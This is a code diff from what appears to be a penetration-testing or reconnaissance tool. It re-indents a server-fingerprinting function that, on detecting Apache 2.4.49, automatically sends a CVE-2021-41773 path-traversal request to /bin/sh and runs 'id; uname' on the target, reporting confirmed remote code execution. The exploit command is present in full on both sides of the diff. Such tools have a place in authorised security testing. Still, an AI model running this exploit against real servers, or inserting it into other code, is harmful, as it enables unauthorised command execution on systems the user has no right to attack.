@@ -121,35 +121,34 @@ def http_identify_server(host, port, proto='http'):
             server_header = response.headers['Server']
             server = server_header
 
-        if ('Apache' in server_header):
-            printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
-            extensions.append('html')
-            extensions.append('php')
+            if ('Apache' in server_header):
+                printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
+                extensions.append('html')
+                extensions.append('php')
 
-        if '2.4.49' in server_header:
-            cmd = f"curl {proto}://{host}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
-            try:
-                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+                if '2.4.49' in server_header:
+                    cmd = f"curl {proto}://{host}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
+                    try:
+                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
-                if output:
-                    if 'uid' in output:
-                        print_banner(port)
-                        printc('[+] Possible RCE confirmed. CVE-2021-41773', RED, YELLOW)
-                        printc(cmd, BLUE)
-                        print(output)
-            except Exception as e:
-                printc(f'[-] {e}', RED)
-                return
-        elif ('Microsoft-IIS' in server_header):
-            printc('[!] Microsoft IIS server, Fuzzing for ASP, ASPX files.', GREEN)
-            extensions.append('asp')
-            extensions.append('php')
-            extensions.append('aspx')
-        elif ('Simple' in server_header) and ('Python' in server_header):
-            printc('[!] Python Development Server, Directory listing should be enabled.', GREEN)
-
-        else:
-            print('[!] Unknown Server')
+                        if output:
+                            if 'uid' in output:
+                                print_banner(port)
+                                printc('[+] Possible RCE confirmed. CVE-2021-41773', RED, YELLOW)
+                                printc(cmd, BLUE)
+                                print(output)
+                    except Exception as e:
+                        printc(f'[-] {e}', RED)
+                        return
+            elif ('Microsoft-IIS' in server_header):
+                printc('[!] Microsoft IIS server, Fuzzing for ASP, ASPX files.', GREEN)
+                extensions.append('asp')
+                extensions.append('php')
+                extensions.append('aspx')
+            elif ('Simple' in server_header) and ('Python' in server_header):
+                printc('[!] Python Development Server, Directory listing should be enabled.', GREEN)
+            else:
+                print('[!] Unknown Server')
 
         printc(f'[+] {server_header}', BLUE)
     except Exception as e:
